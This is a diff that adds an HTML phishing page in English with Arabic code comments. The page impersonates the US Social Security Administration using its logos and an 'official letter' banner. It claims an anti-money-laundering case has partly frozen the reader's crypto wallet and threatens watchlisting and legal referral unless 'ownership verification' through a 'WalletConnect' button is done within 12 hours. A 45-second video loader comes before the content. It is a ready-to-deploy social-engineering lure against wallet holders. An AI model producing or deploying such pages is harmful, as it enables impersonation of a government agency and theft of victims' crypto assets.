@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Loading...</title>
+
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        overflow: hidden;
+    }
+
+    .video-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        z-index: 9999;
+    }
+
+    .video-container video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover; /* يجعل الفيديو يغطي كامل الصفحة */
+    }
+</style>
+
+<script>
+    // إخفاء الفيديو وإظهار المحتوى بعد 3 ثواني
+    setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("main-content").style.display = "block";
+    }, 45000); // عدل المدة لو تحتاج
+</script>
+
+</head>
+<body>
+
+<!-- شاشة الفيديو -->
+<div id="loader">
+    <video src="https://sumsub.com/wp/wp-content/videos/main/heroMainPageV2.webm" autoplay muted loop></video>
+</div>
+
+<!-- المحتوى الأصلي كامل -->
+<div id="main-content">
+
+<body style="font-family: 'Roboto', sans-serif; background-color: #f5f7fa; color: #333333; line-height: 1.6; margin: 0; padding: 20px;">
+    <div style="max-width: 800px; margin: 0 auto; background-color: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);">
+
+        <div style="background-color: #FFF; color: #112f4e; padding: 5px 20px 10px 50px; margin: -40px -40px 30px -40px;display: flex; align-items: center; gap: 10px;">
+            <img class="usa-banner__header-flag" src="https://www.ssa.gov/themes/custom/ssa_core/package/dist/img/us_flag_small.png" alt="U.S. flag">
+            </h1 class="tiny">An official letter from the United States government</h1>
+        </div>
+
+        <div style="background-color: #e7f6f8; color: black; padding: 20px 20px 25px 70px; margin: -40px -40px 30px -40px;">
+            <h1 style="font-family: Georgia, Cambria, Times New Roman; margin: 0; font-size: 1.13rem; font-style: normal; line-height: 1.4;">Immediate Action Required</h1>
+        </div>
+
+        <div style="background-color: #0b4778; color: white; padding: 5px 20px 0px 17px; margin: -40px -40px 30px -40px; display: flex; align-items: center; gap: 10px;">
+            <span class="ssa-logo__image" style="display: inline-block;">
+                <img src="https://ssa.gov/themes/custom/ssa_core/logo.svg" alt="Home" style="width: 50px; height: auto;">
+            </span>
+
+            <h1 style="font-family: 'Georgia', 'Cambria', 'Times New Roman', serif; margin: 0; font-size: 1.4rem; font-weight: 400; line-height: 1;">Social Security</h1>
+        </div>
+
+        <h2 style="font-family: 'Merriweather', serif; color: #112F4E; font-size: 24px; border-bottom: 2px solid #D83933; padding-bottom: 10px;">Urgent Compliance Notice – Preliminary Activity Freeze | Case ID: AML-4478291</h2>
+
+        <p style="color:#2378c3; font-size:18px;">Dear valued client,</p>
+
+        <p>
+            We hereby inform you that the Anti–Money Laundering (AML) Compliance Division has opened an official
+            investigation file under the following reference number: Case ID: AML-4478291
+        </p>
+
+        <h3 style="font-family: 'Merriweather', serif; color: #112F4E; font-size: 20px; margin-top: 30px;">This action was taken after identifying transactions linked to your digital wallet that contain high-risk indicators, potentially associated with:</h3>
+
+        <ul>
+            <li><span style="font-size:14px;">Movement of funds with unidentified origin</span></li>
+            <li><span style="font-size:14px;">Abnormal or irregular transaction patterns</span></li>
+            <li><span style="font-size:14px;">Possible connections to internationally sanctioned entities<br></span></li>
+
+            <li>
+                <h3 style="font-family: 'Merriweather', serif; color: #112F4E; font-size: 20px; margin-top: 30px;">As a result, the following measures have been initiated:</h3>
+                <ol>
+                    <li>
+                        <div style="font-family: Arial, sans-serif; font-size:14px; line-height:1.4; padding:12px; border-radius:8px; background:#fff9f0; color:#333; max-width:600px;">
+                            <strong>Enhanced monitoring activated</strong>
+                            <div>on all activities originating from your wallet.</div>
+                        </div>
+                    </li>
+
+                    <li>
+                        <div style="font-family: Arial, sans-serif; font-size:14px; line-height:1.4; padding:12px; border-radius:8px; background:#fff9f0; color:#333; max-width:600px;">
+                            <strong>A preliminary partial freeze</strong>
+                            <div>has been applied to safeguard assets until verification is completed.</div>
+                        </div>
+                    </li>
+
+                    <li>
+                        <div style="font-family: Arial, sans-serif; font-size:14px; line-height:1.4; padding:12px; border-radius:8px; background:#fff9f0; color:#333; max-width:600px;">
+                            <div>A preliminary file is being prepared for submission to the relevant regulatory authorities should you fail to comply.</div>
+                        </div>
+                    </li>
+
+                    <li>
+                        <p style="font-size:14px; color:#000;">
+                            <p>To prevent escalation to <strong>mandatory legal actions</strong>, it is required that you complete the ownership verification process within the next <strong>12 hours</strong>.</p>
+                        </p>
+                    </li>
+                </ol>
+            </li>
+        </ul>
+
+        <div class="download-box">
+            <div class="download-icon">
+                <!-- SVG كما هو بدون تغيير -->
+            </div>
+
+            <div class="download-content">
+                <h2>🔐 Official Verification System – WalletConnect</h2>
+                <p>Official verification link via WalletConnect:</p>
+                <a class="button" id="downloadBtn" href="https://www.ssa.gov/">Complete the verification</a>
+            </div>
+        </div>
+
+        <div style="font-family: Arial, sans-serif; font-size: 14px; color: #000;">
+            <p><strong>❗ Actions in Case of Non-Compliance:</strong></p>
+            <ol>
+                <li>Full freeze of the wallet linked to the case.</li>
+                <li>Inclusion of the wallet address in international watchlists.</li>
+                <li>Blocking any future transactions until the file is closed.</li>
+                <li>Referral of the case to the relevant regulatory and legal authorities.</li>
+            </ol>
+            <p><strong>This notice serves as the final warning before the second phase of actions begins.</strong></p>
+        </div>
+
+        <div style="font-family: Arial, sans-serif; font-size: 14px; line-height: 1.6;">
+            <p><strong>Department:</strong> AML Compliance Division</p>
+            <p><strong>Case ID:</strong> AML-4478291</p>
+            <p><strong>Status:</strong> Pending Verification</p>
+        </div>
+
+        <p><strong>Best Regards,<br>AML Compliance Division</strong></p>
+
+    </div>
+</div>
+
+</body>
+</html>
